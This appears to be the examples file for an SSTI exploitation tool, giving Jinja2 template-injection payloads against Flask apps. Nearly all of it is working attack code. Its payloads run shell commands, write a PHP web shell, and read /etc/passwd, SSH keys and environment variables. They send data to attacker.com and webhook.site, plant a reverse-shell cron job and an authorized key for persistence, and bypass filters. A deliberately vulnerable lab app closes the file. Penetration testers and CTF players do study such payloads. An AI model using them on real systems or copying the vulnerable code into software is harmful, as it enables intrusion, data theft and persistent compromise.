# Exploitation Examples

This document contains real-world examples and scenarios for using the SSTI Exploitation Framework.

## Example 1: Basic Flask Application

### Target
```
Application: Flask blog with comment system
Vulnerability: User comments rendered with Jinja2
Endpoint: POST /comment
Parameter: content
```

### Configuration
```
Target URL: http://localhost:5000/comment
HTTP Method: POST
Vulnerable Parameter: content
Additional Parameters: [none]
Custom Headers: [none]
Cookies: [none]
```

### Expected Output
```
[ OK ] Found 517 classes
[ OK ] Identified 4 exploitable vectors
```

### Working Payload
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('whoami').read() }}
```

### Result
```
OUTPUT: www-data
```

---

## Example 2: CTF Challenge with Authentication

### Target
```
Challenge: "Template Master" CTF
Authentication: Session cookie required
Endpoint: POST /render
Parameter: template
```

### Configuration
```
Target URL: http://10.10.3.17/render
HTTP Method: POST
Vulnerable Parameter: template
Additional Parameters: [none]
Custom Headers: [none]
Cookies: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Working Payload
```python
{{ ''.__class__.__mro__[1].__subclasses__()[516].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag.txt').read() }}
```

### Result
```
OUTPUT: CTF{template_inj3cti0n_is_dangerous}
```

---

## Example 3: API with Custom Headers

### Target
```
Application: REST API with template rendering
Authentication: Bearer token
Endpoint: POST /api/v1/template/render
Parameter: body
Content-Type: application/json required
```

### Configuration
```
Target URL: http://api.example.com/api/v1/template/render
HTTP Method: POST
Vulnerable Parameter: body
Additional Parameters: [none]
Custom Headers: Authorization:Bearer abc123,Content-Type:application/json
Cookies: [none]
```

### Note
For JSON payloads, you need to escape the payload properly:
```json
{
  "body": "{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('id').read() }}"
}
```

---

## Example 4: Multi-step Exploitation

### Target
```
Application: Admin panel with template preview
Step 1: Enumerate classes
Step 2: Find writable directory
Step 3: Write web shell
Step 4: Execute commands
```

### Step 1: Basic Enumeration
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### Step 2: Find Current Directory
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('pwd').read() }}
```

### Step 3: Write Web Shell
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php').read() }}
```

### Step 4: Access Web Shell
```bash
curl "http://target.com/shell.php?cmd=whoami"
```

---

## Example 5: Bypassing Filters

### Scenario: Basic Blacklist
Target blocks: `__`, `class`, `mro`, `import`

### Bypass Techniques

#### String Concatenation
```python
{{ ''['__cl'+'ass__']['__mr'+'o__'][1]['__subcl'+'asses__']() }}
```

#### Attribute Access
```python
{{ ''|attr('__class__')|attr('__mro__')[1]|attr('__subclasses__')() }}
```

#### Using request object
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

---

## Example 6: Reading Sensitive Files

### /etc/passwd
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('cat /etc/passwd').read() }}
```

### SSH Keys
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('cat /home/user/.ssh/id_rsa').read() }}
```

### Environment Variables
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('env').read() }}
```

### Application Source
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('cat app.py').read() }}
```

---

## Example 7: Network Reconnaissance

### Port Scanning (Local)
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('netstat -tulpn').read() }}
```

### Check Network Interfaces
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('ifconfig').read() }}
```

### DNS Enumeration
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('cat /etc/resolv.conf').read() }}
```

---

## Example 8: Data Exfiltration

### Via DNS (Out-of-Band)
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('nslookup $(whoami).attacker.com').read() }}
```

### Via HTTP Request
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('curl http://attacker.com/?data=$(cat /flag.txt | base64)').read() }}
```

### Via Webhook
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('curl -X POST -d "flag=$(cat /flag.txt)" http://webhook.site/xxx').read() }}
```

---

## Example 9: Privilege Escalation Checks

### Current User & Groups
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('id').read() }}
```

### Sudo Permissions
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('sudo -l').read() }}
```

### SUID Binaries
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('find / -perm -4000 -type f 2>/dev/null').read() }}
```

---

## Example 10: Persistence Mechanisms

### Cron Job
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/attacker.com/4444 0>&1\'" >> /tmp/cron').read() }}
```

### SSH Authorized Keys
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys').read() }}
```

**Important**: These examples are for educational purposes only. Always ensure you have proper authorization before testing.

---

## Common Issues & Solutions

### Issue: Class index varies
**Solution**: The tool automatically detects indices. If manually testing, always verify:
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### Issue: Output truncated
**Solution**: Redirect to file or use base64 encoding:
```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('cat /etc/passwd | base64').read() }}
```

### Issue: Special characters break payload
**Solution**: Use base64 encoding for complex commands:
```bash
# On attacker machine
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64
# Result: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjEK

# In payload
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjEK | base64 -d | bash').read() }}
```

---

## Testing Checklist

Before starting exploitation:
- [ ] Confirm SSTI vulnerability exists
- [ ] Test basic payload: `{{ 7*7 }}` → 49
- [ ] Identify template engine (Jinja2)
- [ ] Check for input filters/WAF
- [ ] Test class access: `{{ ''.__class__ }}`
- [ ] Get authorization if penetration test
- [ ] Setup listener if using reverse shell
- [ ] Document all findings

---

## Payload Customization

### Template for Custom Commands
```python
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['popen']('YOUR_COMMAND').read() }}
```

Replace:
- `INDEX`: Class index from tool output (e.g., 154)
- `YOUR_COMMAND`: Your shell command

### Encoding Tips
- URL encode: Use tool output or `urllib.parse.quote()`
- Base64 encode: For complex commands with special chars
- Hex encode: Alternative to base64

---

## Lab Environment Setup

To practice safely:

```bash
# Create vulnerable Flask app
cat > app.py << 'EOF'
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form.get('name', '')
        template = f'<h1>Hello {name}!</h1>'
        return render_template_string(template)
    return '<form method="post"><input name="name"><button>Submit</button></form>'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
EOF

# Run vulnerable app
python3 app.py

# Test with our tool
python3 ssti_exploit.py
# URL: http://localhost:5000/
# Method: POST
# Parameter: name
```

This creates a deliberately vulnerable environment for safe testing.
